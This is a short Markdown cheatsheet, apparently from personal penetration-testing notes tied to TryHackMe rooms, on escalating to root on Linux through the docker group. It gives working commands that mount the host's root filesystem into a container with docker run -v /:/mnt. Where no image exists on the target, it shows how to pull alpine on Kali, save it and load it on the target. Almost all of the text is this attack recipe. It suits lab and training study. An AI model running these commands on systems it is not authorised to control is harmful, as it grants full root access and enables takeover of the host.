---
title: Cheatsheet - Docker Group
categories: [Cheatsheet, Linux Privilege Escalation]
tags: [linux-priv-esc/docker, cheatsheet/linux]
---

# Docker Group Exploit:
1.  If docker container exists on the target
	```
	docker run -v /:/mnt -it <container Name>
	-v: volume mount
	-it: interactive terminal
	alpine: a container name, alpine is a small container
	```
2. If docker container does not exist on target
	```
	# On Kali
	docker pull alpine
	docker images #take note of image ID
	docker save --output alpine.tar <image ID>
	
	# On Target
	docker load --input alpine.tar
	docker images #take note of image ID
	docker run -v /:/mnt -it <image ID>
	cd /mnt/root
	```
	- Some Examples
	- TryHackMe Ultratech - Privilege Escalation via Docker
	- The Marketplace - Privilege Escalation to Root via docker
    


